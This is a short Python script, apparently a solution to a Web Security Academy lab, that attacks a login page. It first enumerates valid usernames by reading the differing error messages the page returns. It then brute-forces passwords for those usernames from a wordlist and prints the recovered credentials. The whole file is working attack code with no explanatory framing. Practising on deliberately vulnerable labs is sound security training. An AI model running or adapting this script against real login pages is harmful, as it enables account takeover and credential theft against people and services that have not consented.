from bs4 import BeautifulSoup
import requests

# ++++++++++++++++
# Constantly new.
# ++++++++++++++++
TARGET = 'https://ac051f651f2a2f8ac0d8a3200053002d.web-security-academy.net/login'

PAYLOAD = {
# ++++++++++++++++++++++++++++++++++
# if payload['password'] == None || 
#    payload['password'] == ''
#
# Server response:      400
# ++++++++++++++++++++++++++++++++++
    'username': None,
    'password': 'password'
}

RESPONSE_OK             = 200

INVALID_CREDENTIALS     = 'Invalid username or password.'
INVALID_PASSWORD        = 'Incorrect password'


with open('usernames.txt', 'r') as f:
    USERNAMES = [username[:-1] for username in f.readlines()]

with open('passwords.txt', 'r') as f:
    PASSWORDS = [password[:-1] for password in f.readlines()]


VALID_CREDENTIALS = {}

for username in USERNAMES:
    PAYLOAD['username'] = username

    r = requests.post(TARGET, data = PAYLOAD)
    soup = BeautifulSoup(r.content, 'html.parser')

    if r.status_code != RESPONSE_OK:
        print(r.status_code)

    warning_msg = soup.find(class_ = 'is-warning').string
    
    if warning_msg != INVALID_CREDENTIALS:
        VALID_CREDENTIALS[username] = None

VALID_USERNAMES = VALID_CREDENTIALS.keys()

for username in VALID_USERNAMES:
    PAYLOAD['username'] = username
    
    for password in PASSWORDS:
        PAYLOAD['password'] = password

        r = requests.post(TARGET, data = PAYLOAD)
        soup = BeautifulSoup(r.content, 'html.parser')

        if r.status_code != RESPONSE_OK:
            print(r.status_code)

        warning_tag = soup.find(class_ = 'is-warning')

        if type(warning_tag) == type(None):
            VALID_CREDENTIALS[username] = password
            break

print(VALID_CREDENTIALS)
    